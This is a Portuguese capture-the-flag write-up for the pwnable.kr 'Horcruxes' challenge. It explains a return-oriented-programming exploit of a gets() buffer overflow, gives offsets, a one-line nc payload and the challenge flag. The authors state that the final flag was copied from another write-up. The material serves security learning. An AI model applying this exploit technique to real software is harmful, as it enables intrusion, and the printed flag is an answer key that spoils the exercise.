# DuckWare Team - Horcruxes (pwnable.kr)
###### Solved by @JoãoPedroPiceli and @xpics:)

> Este CTF aborda a exploração de **Return Oriented Programming (ROP)** para obter controle do fluxo de execução e acessar a flag.

---
# 🎯 Desafio: Horcruxes (pwnable.kr) - Exploração de ROP

## 📂 Baixando os Arquivos

baixando todos os arquivos do desafio usando:

```sh
scp -r -P2222 horcruxes@pwnable.kr:~/ ./
```

## 🔍 Analisando o Código com Ghidra

Ao decompilar o binário no **Ghidra**, identificamos:
- A função `main` limita certos **syscalls**.
- `init_ABCDEFG` gera **sete números aleatórios** (A-G).
- A função `ropme` permite **adivinhar um número** e chama `gets()`, onde há um **buffer overflow**.

```c
else {
    printf("How many EXP did you earn? : ");
    gets(local_78);  // Vulnerabilidade de buffer overflow
    iVar1 = atoi(local_78);
    if (iVar1 == sum) {
      local_10 = open("flag",0);
      sVar2 = read(local_10,local_78,100);
      local_78[sVar2] = '\0';
      puts(local_78);
      close(local_10);
      exit(0);
    }
}
```

## 🛠 Criando a Cadeia de ROP

O objetivo é **explorar o buffer overflow** e **executar as funções A-G** para imprimir os números aleatórios.

### **Endereços importantes**

Executamos `gdb` para inspecionar `ropme`:

```sh
disas ropme
```

Observamos que `gets()` escreve em `0xffffdb54`, enquanto o retorno da função `ropme` está em `0xffffdbcc`.

```sh
0xffffdb54 - 0xffffdbcc = 0x78 = 120 bytes
```

Ou seja, precisamos enviar **120 bytes de lixo**, seguidos pelos **endereços das funções A-G** e o endereço do `jmp ropme` dentro de `main`.

### **Extraindo os Endereços**

```sh
readelf -s horcruxes | grep FUNC
```

Isso nos dá os **endereços das funções relevantes**.

## 🚀 Criando e Executando o Payload

O ataque consiste em:
1. **120 bytes de preenchimento**
2. **Endereços das funções A-G**
3. **Endereço do `jmp ropme`**

Montamos e enviamos o exploit:

```sh
(echo 15; (for i in {1..120}; do printf %s 49; done;) | xxd -r -p; 
echo 4bfe09086afe090889fe0908a8fe0908c7fe0908e6fe090805ff0908fcff0908 0a | xxd -r -p; cat) | nc 0 9032 -q 1
```

## 🏆 Obtendo a Flag

Ao executar o exploit:
- Os **sete números aleatórios** são impressos.
- Calculamos e enviamos a soma correta.
- A flag é revelada! 🎉
- Obs: Não foi possível finalizar o desafio, pois o site saiu do ar. Por esse motivo, não consegui imprimir as mensagens que aparecem nem calcular o valor exato. O final e a flag que se encontram como resultado são mérito de: https://github.com/golombi/Pwnable.kr-CTF-Writeups/blob/main/horcruxes

```
Magic_spell_1s_4vad4_K3daVr4!
```
```
